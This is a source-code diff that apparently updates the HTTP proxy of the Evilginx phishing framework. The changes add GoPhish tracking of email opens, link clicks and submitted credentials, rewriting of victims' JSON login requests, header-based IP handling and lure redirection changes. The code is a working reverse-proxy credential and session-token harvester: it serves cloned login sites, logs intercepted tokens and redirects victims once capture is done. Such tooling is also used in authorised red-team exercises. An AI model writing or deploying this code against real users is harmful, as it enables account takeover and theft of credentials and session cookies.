@@ -56,11 +56,11 @@ const (
 const (
 	httpReadTimeout  = 45 * time.Second
 	httpWriteTimeout = 45 * time.Second
-
-	// borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
-	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
-	MATCH_URL_REGEXP_WITHOUT_SCHEME = `\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
 )
+
+// original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
+var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 
 type HttpProxy struct {
 	Server            *http.Server
@@ -69,6 +69,7 @@ type HttpProxy struct {
 	cfg               *Config
 	db                *database.Database
 	bl                *Blacklist
+	gophish           *GoPhish
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -91,6 +92,20 @@ type ProxySession struct {
 	Index        int
 }
 
+// set the value of the specified key in the JSON body
+func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
+	var data map[string]interface{}
+	if err := json.Unmarshal(body, &data); err != nil {
+		return nil, err
+	}
+	data[key] = value
+	newBody, err := json.Marshal(data)
+	if err != nil {
+		return nil, err
+	}
+	return newBody, nil
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -99,6 +114,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		cfg:               cfg,
 		db:                db,
 		bl:                bl,
+		gophish:           NewGoPhish(),
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -151,10 +167,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			hiblue := color.New(color.FgHiBlue)
 
 			// handle ip blacklist
-			from_ip := req.RemoteAddr
-			if strings.Contains(from_ip, ":") {
-				from_ip = strings.Split(from_ip, ":")[0]
+			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+
+			// handle proxy headers
+			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
+			for _, h := range proxyHeaders {
+				origin_ip := req.Header.Get(h)
+				if origin_ip != "" {
+					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
+					break
+				}
 			}
+
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
@@ -163,12 +187,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return p.blockRequest(req)
 				}
 				if p.cfg.GetBlacklistMode() == "all" {
-					err := p.bl.AddIP(from_ip)
-					if p.bl.IsVerbose() {
-						if err != nil {
-							log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
-						} else {
-							log.Warning("blacklisted ip address: %s", from_ip)
+					if !p.bl.IsWhitelisted(from_ip) {
+						err := p.bl.AddIP(from_ip)
+						if p.bl.IsVerbose() {
+							if err != nil {
+								log.Error("blacklist: %s", err)
+							} else {
+								log.Warning("blacklisted ip address: %s", from_ip)
+							}
 						}
 					}
 
@@ -186,8 +212,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
-			parts := strings.SplitN(req.RemoteAddr, ":", 2)
-			remote_addr := parts[0]
+			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
@@ -226,11 +251,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						session_id = session_id[:len(session_id)-3]
 						if s, ok := p.sessions[session_id]; ok {
 							var d_body string
-
-							if s.RedirectURL != "" {
-								dynamic_redirect_js := DYNAMIC_REDIRECT_JS
-								dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
-								d_body += dynamic_redirect_js + "\n\n"
+							if !s.IsDone {
+								if s.RedirectURL != "" {
+									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
+									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
+									d_body += dynamic_redirect_js + "\n\n"
+								}
 							}
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
 							return req, resp
@@ -274,7 +300,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
-					l, err := p.cfg.GetLureByPath(pl_name, req_path)
+					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						log.Debug("triggered lure for path '%s'", req_path)
 					}
@@ -292,8 +318,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					} else {
-						log.Warning("session cookie not found: %s (%s) [%s]", req_url, remote_addr, pl.Name)
-
 						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
 							// not a lure path and IP is whitelisted
 
@@ -330,12 +354,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
 											if p.cfg.GetBlacklistMode() == "unauth" {
-												err := p.bl.AddIP(from_ip)
-												if p.bl.IsVerbose() {
-													if err != nil {
-														log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
-													} else {
-														log.Warning("blacklisted ip address: %s", from_ip)
+												if !p.bl.IsWhitelisted(from_ip) {
+													err := p.bl.AddIP(from_ip)
+													if p.bl.IsVerbose() {
+														if err != nil {
+															log.Error("blacklist: %s", err)
+														} else {
+															log.Warning("blacklisted ip address: %s", from_ip)
+														}
 													}
 												}
 											}
@@ -348,6 +374,27 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								session, err := NewSession(pl.Name)
 								if err == nil {
+									// set params from url arguments
+									p.extractParams(session, req.URL)
+
+									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+										if trackParam, ok := session.Params["o"]; ok {
+											if trackParam == "track" {
+												// gophish email tracker image
+												rid, ok := session.Params["rid"]
+												if ok && rid != "" {
+													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
+													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
+													if err != nil {
+														log.Error("gophish: %s", err)
+													}
+													return p.trackerImage(req)
+												}
+											}
+										}
+									}
+
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
@@ -355,25 +402,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
 
+									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+										rid, ok := session.Params["rid"]
+										if ok && rid != "" {
+											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
+											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
+											if err != nil {
+												log.Error("gophish: %s", err)
+											}
+										}
+									}
+
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
 										log.Error("database: %v", err)
 									}
 
-									if l != nil {
-										session.RedirectURL = pl.RedirectUrl
-										if l.RedirectUrl != "" {
-											session.RedirectURL = l.RedirectUrl
-										}
-										if session.RedirectURL != "" {
-											session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
-										}
-										session.PhishLure = l
-										log.Debug("redirect URL (lure): %s", session.RedirectURL)
+									session.RemoteAddr = remote_addr
+									session.UserAgent = req.Header.Get("User-Agent")
+									session.RedirectURL = pl.RedirectUrl
+									if l.RedirectUrl != "" {
+										session.RedirectURL = l.RedirectUrl
 									}
-
-									// set params from url arguments
-									p.extractParams(session, req.URL)
+									if session.RedirectURL != "" {
+										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
+									}
+									session.PhishLure = l
+									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
 									ps.SessionId = session.Id
 									ps.Created = true
@@ -386,12 +441,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
 								if p.cfg.GetBlacklistMode() == "unauth" {
-									err := p.bl.AddIP(from_ip)
-									if p.bl.IsVerbose() {
-										if err != nil {
-											log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
-										} else {
-											log.Warning("blacklisted ip address: %s", from_ip)
+									if !p.bl.IsWhitelisted(from_ip) {
+										err := p.bl.AddIP(from_ip)
+										if p.bl.IsVerbose() {
+											if err != nil {
+												log.Error("blacklist: %s", err)
+											} else {
+												log.Warning("blacklisted ip address: %s", from_ip)
+											}
 										}
 									}
 								}
@@ -413,7 +470,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
-						l, err := p.cfg.GetLureByPath(pl_name, req_path)
+						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
 							if l.Redirector != "" {
@@ -519,14 +576,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// redirect to login page if triggered lure path
 				if pl != nil {
-					_, err := p.cfg.GetLureByPath(pl_name, req_path)
+					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
-						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-						if resp != nil {
-							resp.Header.Add("Location", rurl)
-							return req, resp
+						u, err := url.Parse(rurl)
+						if err == nil {
+							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
+								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+								if resp != nil {
+									resp.Header.Add("Location", rurl)
+									return req, resp
+								}
+							}
 						}
 					}
 				}
@@ -541,18 +603,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// check if request should be intercepted
-				if pl != nil {
-					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-						for _, ic := range pl.intercept {
-							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
-							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
-							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
-							}
-						}
-					}
-				}
 				// replace "Host" header
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
@@ -660,6 +710,45 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
+							// force post json
+							for _, fp := range pl.forcePost {
+								if fp.path.MatchString(req.URL.Path) {
+									log.Debug("force_post: url matched: %s", req.URL.Path)
+									ok_search := false
+									if len(fp.search) > 0 {
+										k_matched := len(fp.search)
+										for _, fp_s := range fp.search {
+											matches := fp_s.key.FindAllString(string(body), -1)
+											for _, match := range matches {
+												if fp_s.search.MatchString(match) {
+													if k_matched > 0 {
+														k_matched -= 1
+													}
+													log.Debug("force_post: [%d] matched - %s", k_matched, match)
+													break
+												}
+											}
+										}
+										if k_matched == 0 {
+											ok_search = true
+										}
+									} else {
+										ok_search = true
+									}
+									if ok_search {
+										for _, fp_f := range fp.force {
+											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											if err != nil {
+												log.Debug("force_post: got error: %s", err)
+											}
+											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
+										}
+									}
+									req.ContentLength = int64(len(body))
+									log.Debug("force_post: body: %s len:%d", body, len(body))
+								}
+							}
+
 						} else if form_re.MatchString(contentType) {
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
@@ -758,6 +847,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+					}
+				}
+
+				// check if request should be intercepted
+				if pl != nil {
+					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+						for _, ic := range pl.intercept {
+							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
+								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+							}
+						}
 					}
 				}
 
@@ -959,6 +1061,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.Finish(false)
+
+						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+							rid, ok := s.Params["rid"]
+							if ok && rid != "" {
+								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
+								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
+								if err != nil {
+									log.Error("gophish: %s", err)
+								}
+							}
+						}
 					}
 				}
 			}
@@ -1088,6 +1201,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 							}
+
+							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+								rid, ok := s.Params["rid"]
+								if ok && rid != "" {
+									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
+									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
+									if err != nil {
+										log.Error("gophish: %s", err)
+									}
+								}
+							}
 							break
 						}
 					}
@@ -1102,7 +1226,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
-						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && stringExists(string(body), []string{"<head>", "<body>"}) {
+						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
 							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
@@ -1161,6 +1285,14 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		if resp != nil {
 			return req, resp
 		}
+	}
+	return req, nil
+}
+
+func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
+	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
+	if resp != nil {
+		return req, resp
 	}
 	return req, nil
 }
@@ -1262,6 +1394,8 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 				} else {
 					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
 				}
+			} else {
+				log.Debug("extractParams: %s", err)
 			}
 		}
 	}
@@ -1347,8 +1481,8 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 }
 
 func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
-	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
-	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
+	re_url := MATCH_URL_REGEXP
+	re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME
 
 	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
 		var sub_map map[string]string = make(map[string]string)
@@ -1684,10 +1818,7 @@ func (p *HttpProxy) handleSession(hostname string) bool {
 			}
 			for _, ph := range pl.proxyHosts {
 				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-					if ph.handle_session || ph.is_landing {
-						return true
-					}
-					return false
+					return true
 				}
 			}
 		}
